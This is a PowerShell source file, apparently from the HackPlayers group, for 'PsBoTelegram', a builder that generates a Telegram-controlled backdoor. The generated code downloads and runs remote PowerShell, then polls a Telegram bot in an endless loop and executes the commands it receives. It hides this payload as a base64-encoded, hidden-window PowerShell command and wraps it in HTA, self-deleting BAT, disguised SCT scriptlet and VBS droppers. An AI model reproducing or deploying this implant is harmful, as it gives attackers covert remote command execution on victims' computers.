function PsBoTelegram {
<#
.SYNOPSIS
    Crea conexi?n remota con Telegram.
    PowerShell Function: PsBoTelegram
    Author: CyberVaca
    Dependencias Requeridas: Ninguna
    Dependencias Opcionales: Ninguna
.DESCRIPTION
    PSBoTelegram 
.PARAMETER Process
    -your_token = 
    -your_chat_id =
    -your_delay =
    -hta
    -bat
    -vbs
    -sct
.EXAMPLE
    PsBoTelegram -your_token 349281:uodivKvSvkzX3VsUvDf6toJu -your_chat_id 1231723 -your_delay 1 

    Descripcion
    -----------
    Esto nos crearia el code en BASE64
   
#>

    [CmdletBinding()]

    param ([string]$your_token,[string]$your_chat_id,[int]$your_delay,[switch]$HTA,[switch]$BAT,[switch]$VBS,[string]$SCT)




[string]$banner = "    ____  _____ ____      ______     __                              
   / __ \/ ___// __ )____/_  __/__  / /__   ____ __________ _____ __
  / /_/ /\__ \/ __  / __ \/ / / _ \/ / _ \/ __  / ___/ __  / __  __ \
 / ____/___/ / /_/ / /_/ / / /  __/ /  __/ /_/ / /  / /_/ / / / / / /
/_/    /____/_____/\____/_/  \___/_/\___/\__, /_/   \__,_/_/ /_/ /_/ 
                                        /____/                       
                                        
                                        $version by CyberVaca @ HackPlayers
                                        
.SYNOPSIS
    Crea conexi?n remota con Telegram.
    PowerShell Function: PsBoTelegram
    Author: CyberVaca
    Dependencias Requeridas: Ninguna
    Dependencias Opcionales: Ninguna
.DESCRIPTION
    PSBoTelegram 
.PARAMETER Process
    -your_token = 
    -your_chat_id =
    -your_delay =
    -hta
    -bat
    -vbs
    -sct
.EXAMPLE
    PsBoTelegram -your_token 349281:uodivKvSvkzX3VsUvDf6toJu -your_chat_id 1231723 -your_delay 1 

    Descripcion
    -----------
    Esto nos crearia el code en BASE64" 
                                        
                                       




if ($your_token -eq $null -or $your_chat_id -eq $null -or $your_delay -eq $null -or $your_token -eq "" -or $your_chat_id -eq "" -or $your_delay -eq "") {return $banner ; break}



Function check-command
{
 Param ($command)
 $antigua_config = $ErrorActionPreference
 $ErrorActionPreference = 'stop'
 try {if(Get-Command $command){RETURN $true}}
 Catch { RETURN $false}
 Finally {$ErrorActionPreference=$antigua_config}
 }

################################### Comprobamos si existe el cmdlet Ivoke-WebRequest y en el caso de que no exista lo cargamos ######################################

if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclient" ; $webclient = New-Object $objeto ; $webrequest = $webclient.DownloadString("https://raw.githubusercontent.com/mwjcomputing/MWJ-Blog-Respository/master/PowerShell/Invoke-WebRequest.ps1"); IEX $webrequest}

########################################## Funci?n para encodear en Base64 ##########################################
function code_a_base64 {param ($code)
$ms = New-Object IO.MemoryStream
$action = [IO.Compression.CompressionMode]::Compress
$cs = New-Object IO.Compression.DeflateStream ($ms,$action)
$sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
$code | ForEach-Object {$sw.WriteLine($_)}
$sw.Close()
$Compressed = [Convert]::ToBase64String($ms.ToArray())
$command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
"`$(New-Object IO.Compression.DeflateStream (" +
"`$(New-Object IO.MemoryStream (,"+
"`$([Convert]::FromBase64String('$Compressed')))), " +
"[IO.Compression.CompressionMode]::Decompress)),"+
" [Text.Encoding]::ASCII)).ReadToEnd();"
$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
$codeScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
return $codeScript
}

############################################################### ScriptBlock del Backdoor ###############################################################
$scriptblock = '
[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay"
IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content 
$chat_id = $bot_Master_ID ; $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1"
while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json
    $l = $json.result.length
	$i = 0
if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1}
	while ($i -lt $l) {$offset = $json.result[$i].update_id + 1
        $comando = $json.result[$i].message.text
        test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect | out-null
   	$i++
	}
	Start-Sleep -s $delay ;$first_connect++}'
$scriptblock = $scriptblock -replace "your_token", "$your_token" -replace "your_chat_id", "$your_chat_id" -replace "your_delay", "$your_delay"
$code = code_a_base64 -code $scriptblock; $code = "powershell.exe -win hidden -enc $code"

######################################################## Tipos de Archivos #######################################################################

$plantilla_hta = "<html><head><script>var c= '$code' 
new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>" 
$plantilla_bat = '@echo off
start /b ' + $code + '
start /b "" cmd /c del "%~f0"&exit /b' 
$plantilla_sct = '<?XML version="1.0"?>
<scriptlet>
<registration
description="Win32COMDebug"
progid="Win32COMDebug"
version="1.00"
classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 >
 <script language="JScript">
      <![CDATA[
           var r = new ActiveXObject("WScript.Shell").Run("' + $CODE + '",0);
      ]]>
 </script>
</registration>
<public>
    <method name="Exec"></method>
</public>
</scriptlet>'
$plantilla_vbs = 'Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
command = "' + $code + '"
objShell.Run command,0
Set objShell = Nothing'
$plantilla_macro = "Cooming soon"
############################################################### Funcion Expotar code a archivo ###############################################################

if ($HTA -eq $true) {$plantilla = $plantilla_HTA; $tipo = "hta"}
if ($BAT -eq $true) {$plantilla = $plantilla_BAT;$tipo = "bat"}
if ($SCT -eq $true) {$plantilla = $plantilla_SCT;$tipo = "sct"}
if ($VBS -eq $true) {$plantilla = $plantilla_VBS;$tipo = "vbs"}
if ($HTA -ne $true -and $BAT -ne $true -and $SCT -ne $true -and $VBS -ne $true) {

Write-Host "`n" ;return [string]$code

} else {
function Exportar-Archivo { param ($plantilla,$tipo)

 $salida = "temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida 
}

Exportar-Archivo -plantilla $plantilla -tipo $tipo
ls temp.$tipo

}

}
